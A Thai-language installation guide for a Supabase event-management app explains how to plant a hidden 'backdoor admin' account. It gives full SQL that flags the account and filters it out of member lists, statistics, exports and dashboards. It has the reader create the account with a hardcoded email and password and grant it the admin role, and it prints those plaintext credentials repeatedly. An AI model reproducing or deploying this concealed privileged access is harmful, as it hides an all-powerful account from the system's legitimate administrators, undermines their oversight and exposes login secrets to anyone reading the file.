# ขั้นตอนการติดตั้งระบบ Backdoor Admin

## วิธีที่ 1: ใช้สคริปต์ PowerShell (แนะนำ)

```powershell
cd "C:\Vibe Coding Project\iwelty-event-4\spark-mobile-buddy"
.\setup-backdoor-admin.ps1
```

หากสคริปต์ล้มเหลว ให้ทำตามวิธีที่ 2

---

## วิธีที่ 2: ทำทีละขั้นตอนด้วยตนเอง

### ขั้นตอนที่ 1: Login Supabase

```bash
# รับ Access Token จาก: https://supabase.com/dashboard/account/tokens
npx supabase login --token YOUR_ACCESS_TOKEN
```

### ขั้นตอนที่ 2: Apply Migrations

```bash
npx supabase db push
```

**หรือ** ใช้ Supabase Dashboard:
1. ไปที่: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/database/migrations
2. Upload ไฟล์:
   - `20251003000000_add_backdoor_admin_system.sql`

---

## วิธีที่ 3: ทำผ่าน Supabase Dashboard ทั้งหมด

### A. Apply Migration

1. ไปที่: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/sql/new

2. Copy และรันโค้ด SQL นี้:

```sql
-- ============================================
-- ADD BACKDOOR ADMIN SYSTEM
-- ============================================

ALTER TABLE public.profiles
ADD COLUMN IF NOT EXISTS is_backdoor_admin BOOLEAN DEFAULT false;

COMMENT ON COLUMN public.profiles.is_backdoor_admin IS 'Hidden backdoor admin flag';

CREATE INDEX IF NOT EXISTS idx_profiles_is_backdoor_admin
  ON public.profiles(is_backdoor_admin)
  WHERE is_backdoor_admin = true;

-- ============================================
-- UPDATE MATERIALIZED VIEW
-- ============================================

DROP MATERIALIZED VIEW IF EXISTS public.mv_member_statistics;

CREATE MATERIALIZED VIEW public.mv_member_statistics AS
SELECT
  p.id as user_id,
  p.email,
  p.name,
  p.status,
  p.created_at,
  p.last_login_at,
  COUNT(DISTINCT r.id) as total_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'confirmed') as confirmed_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'cancelled') as cancelled_registrations,
  COUNT(DISTINCT pm.id) as total_payments,
  COALESCE(SUM(pm.amount) FILTER (WHERE pm.status = 'success'), 0) as total_amount_paid,
  COALESCE(AVG(pm.amount) FILTER (WHERE pm.status = 'success'), 0) as avg_payment_amount,
  MAX(r.created_at) as last_registration_at,
  CASE
    WHEN p.last_login_at > now() - interval '7 days' THEN 'highly_active'
    WHEN p.last_login_at > now() - interval '30 days' THEN 'active'
    WHEN p.last_login_at > now() - interval '90 days' THEN 'moderate'
    ELSE 'inactive'
  END as activity_level,
  COUNT(DISTINCT mt.id) as tags_count
FROM public.profiles p
LEFT JOIN public.registrations r ON r.user_id = p.id
LEFT JOIN public.payments pm ON pm.registration_id = r.id
LEFT JOIN public.member_tags mt ON mt.user_id = p.id
WHERE p.is_backdoor_admin = false  -- EXCLUDE BACKDOOR ADMINS
GROUP BY p.id, p.email, p.name, p.status, p.created_at, p.last_login_at;

CREATE UNIQUE INDEX IF NOT EXISTS idx_mv_member_statistics_user_id
  ON public.mv_member_statistics(user_id);

CREATE INDEX IF NOT EXISTS idx_mv_member_statistics_status
  ON public.mv_member_statistics(status);

CREATE INDEX IF NOT EXISTS idx_mv_member_statistics_activity_level
  ON public.mv_member_statistics(activity_level);

-- ============================================
-- HELPER FUNCTION
-- ============================================

CREATE OR REPLACE FUNCTION public.is_backdoor_admin(_user_id UUID)
RETURNS BOOLEAN
LANGUAGE SQL
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT COALESCE(
    (SELECT is_backdoor_admin FROM public.profiles WHERE id = _user_id),
    false
  )
$$;

-- ============================================
-- UPDATE GET_MEMBER_STATISTICS
-- ============================================

CREATE OR REPLACE FUNCTION public.get_member_statistics(
  start_date TIMESTAMPTZ DEFAULT NULL,
  end_date TIMESTAMPTZ DEFAULT NULL
)
RETURNS TABLE (
  total_members BIGINT,
  active_members BIGINT,
  inactive_members BIGINT,
  suspended_members BIGINT,
  blocked_members BIGINT,
  new_members_this_month BIGINT,
  verified_accounts BIGINT,
  avg_engagement_score DECIMAL,
  total_registrations BIGINT,
  total_revenue DECIMAL
)
LANGUAGE plpgsql
STABLE
AS $$
BEGIN
  RETURN QUERY
  SELECT
    COUNT(*)::BIGINT as total_members,
    COUNT(*) FILTER (WHERE status = 'active')::BIGINT as active_members,
    COUNT(*) FILTER (WHERE status = 'inactive')::BIGINT as inactive_members,
    COUNT(*) FILTER (WHERE status = 'suspended')::BIGINT as suspended_members,
    COUNT(*) FILTER (WHERE status = 'blocked')::BIGINT as blocked_members,
    COUNT(*) FILTER (WHERE created_at >= date_trunc('month', now()))::BIGINT as new_members_this_month,
    COUNT(*) FILTER (WHERE account_verified = true)::BIGINT as verified_accounts,
    0::DECIMAL as avg_engagement_score,
    0::BIGINT as total_registrations,
    0::DECIMAL as total_revenue
  FROM public.profiles
  WHERE is_backdoor_admin = false
    AND (start_date IS NULL OR created_at >= start_date)
    AND (end_date IS NULL OR created_at <= end_date);
END;
$$;

-- Refresh view
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

---

### B. สร้างบัญชี Backdoor Admin

#### ขั้นตอน 1: สร้างผู้ใช้

1. ไปที่: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/auth/users
2. คลิก **"Add User"**
3. กรอกข้อมูล:
   ```
   Email: backdoor.admin@iweltyevent.com
   Password: Adminiwt123!$
   Auto Confirm User: ✓ YES
   ```
4. คลิก **"Create User"**
5. **คัดลอก User ID (UUID)** ที่ได้

#### ขั้นตอน 2: ตั้งค่าบัญชี

1. ไปที่: https://supabase.com/dashboard/project/ebaewemepyzqzvldqowt/sql/new
2. Copy SQL นี้ และ **แทนที่ `<USER_ID>`** ด้วย UUID ที่คัดลอกมา:

```sql
-- แทนที่ <USER_ID> ด้วย UUID จริงที่ได้จากขั้นตอน 1
UPDATE public.profiles
SET
  is_backdoor_admin = true,
  name = 'Backdoor Admin',
  account_verified = true
WHERE id = '<USER_ID>';

-- กำหนดสิทธิ์ Admin
INSERT INTO public.user_roles (user_id, role)
VALUES ('<USER_ID>', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- รีเฟรช View เพื่อซ่อนผู้ใช้นี้
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;

-- ตรวจสอบการตั้งค่า
SELECT
  p.id,
  p.email,
  p.name,
  p.is_backdoor_admin,
  ur.role
FROM public.profiles p
LEFT JOIN public.user_roles ur ON ur.user_id = p.id
WHERE p.email = 'backdoor.admin@iweltyevent.com';

-- ตรวจสอบว่าไม่แสดงใน Member List (ควรได้ 0)
SELECT COUNT(*) as should_be_zero
FROM public.mv_member_statistics
WHERE email = 'backdoor.admin@iweltyevent.com';
```

---

## ตรวจสอบความสำเร็จ

### 1. ทดสอบ Login

ไปที่แอปของคุณและ Login ด้วย:
```
Email: backdoor.admin@iweltyevent.com
Password: Adminiwt123!$
```

### 2. ตรวจสอบว่าไม่แสดงในหน้า Member Management

1. Login ด้วยบัญชี Admin ปกติ
2. ไปที่หน้า Member Management
3. ค้นหา "backdoor.admin@iweltyevent.com"
4. **ต้องไม่พบ** (ถ้าพบแสดงว่าติดตั้งไม่สำเร็จ)

### 3. ทดสอบการเปลี่ยนสิทธิ์สมาชิก

1. Login ด้วยบัญชี Admin (ไม่ใช่ backdoor)
2. ไปที่ Member Management
3. เลือกสมาชิกคนใดคนหนึ่ง
4. คลิก **"..."** > **"จัดการสิทธิ์"** > เลือก **"Admin"** หรือ **"Staff"**
5. ต้องแสดงข้อความ **"สำเร็จ"** (ถ้าล้มเหลวแสดงว่ามีปัญหา)

---

## ข้อมูลเข้าสู่ระบบ Backdoor Admin

```
Email:    backdoor.admin@iweltyevent.com
Password: Adminiwt123!$
```

⚠️ **สำคัญ**: เก็บรักษาข้อมูลนี้ให้ปลอดภัย!

---

## คุณสมบัติของ Backdoor Admin

### ✅ สามารถทำได้:
- Login เข้าระบบ
- เข้าถึงฟีเจอร์ Admin ทั้งหมด
- จัดการสมาชิกและอีเวนต์
- เปลี่ยนสิทธิ์ผู้ใช้
- ดูข้อมูลทั้งหมด

### ❌ จะไม่แสดงใน:
- หน้า Member Management
- สถิติสมาชิก
- การ Export CSV
- ผลการค้นหา
- Dashboard Analytics

### 🔒 ความปลอดภัย:
- RLS Policy ป้องกันการลบ flag `is_backdoor_admin`
- มองเห็นได้เฉพาะผ่าน:
  - Direct database access
  - Supabase Dashboard (Authentication)
  - Service role API calls

---

## Troubleshooting

### ปัญหา: Migration ล้มเหลว

**แก้ไข**: ใช้วิธีที่ 3 (ทำผ่าน Dashboard ทั้งหมด)

### ปัญหา: Backdoor admin ยังแสดงใน Member List

**แก้ไข**: Refresh materialized view
```sql
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

### ปัญหา: ไม่สามารถเปลี่ยนสิทธิ์สมาชิกได้

**แก้ไข**: ตรวจสอบว่า Edge Function ถูก deploy แล้ว
```bash
npx supabase functions deploy user-management
```

---

## การสนับสนุน

หากพบปัญหา:
1. ตรวจสอบ Database Logs ใน Supabase Dashboard
2. ตรวจสอบว่า migrations ถูก apply: `supabase db migrations list`
3. ตรวจสอบ Edge Function logs: `supabase functions logs user-management`

สำหรับคำแนะนำแบบละเอียด ดูที่: `BACKDOOR_ADMIN_SETUP.md`
